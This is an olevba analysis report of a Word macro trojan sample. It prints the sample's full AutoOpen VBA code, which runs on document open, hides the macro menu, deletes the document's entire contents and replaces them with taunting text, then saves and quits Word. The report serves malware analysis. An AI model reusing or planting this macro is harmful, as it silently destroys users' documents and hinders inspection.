olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Viol.a-11f04f85ee6f15bd1c5c4018770d5c79bd564d11
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Viol.a-11f04f85ee6f15bd1c5c4018770d5c79bd564d11 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.Viol.a-11f04f85ee6f15bd1c5c4018770d5c79bd564d11 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub AutoOpen()
'
' AutoOpen Macro
' FeRvO sAnTi

CommandBars("Tools").Controls("Macro").Visible = False


   
    Selection.MoveUp Unit:=wdLine, Count:=4
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.Color = wdColorOrange
    Selection.Font.Bold = wdToggle
    Selection.TypeText Text:="JA, JA, JA, JA, JA,JA...!!!!"
    Selection.TypeParagraph
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.Color = wdColorOrange
    Selection.Font.Bold = wdToggle
    Selection.TypeText Text:="NUNCA SABRÁS CUÁNTO TE QUISE..."
    Selection.TypeParagraph
    Selection.TypeText Text:="FERVO"
    ActiveDocument.Save
    ActiveWindow.Close
    Application.Quit

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

